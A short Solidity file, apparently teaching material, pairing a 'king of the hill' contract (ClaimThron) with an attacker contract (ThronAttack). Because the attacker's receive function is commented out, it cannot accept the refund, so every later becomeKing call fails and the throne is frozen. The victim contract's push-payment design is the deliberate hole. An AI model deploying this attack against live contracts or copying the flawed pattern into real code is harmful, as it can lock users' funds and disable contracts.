// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract ClaimThron{
    address public king;
    uint public thronPrice;

    function becomeKing() external payable returns(address){
        uint _thronPrice = thronPrice;
        require(msg.value > _thronPrice, "Insufficient Eth");
        (bool succ, ) = king.call{value: _thronPrice}("");
        require(succ, "Tx Failed");
        thronPrice = msg.value;
        king = msg.sender;

        return king;
    }
}

contract ThronAttack{
    ClaimThron claimThron;
    constructor(address _add)payable{
        claimThron = ClaimThron(_add);
    }

    //receive() external payable{}

    function getBal() external view returns(uint){
        return address(this).balance;
    }

    function attack() external payable{
        claimThron.becomeKing{value: address(this).balance}();
        
    }
}
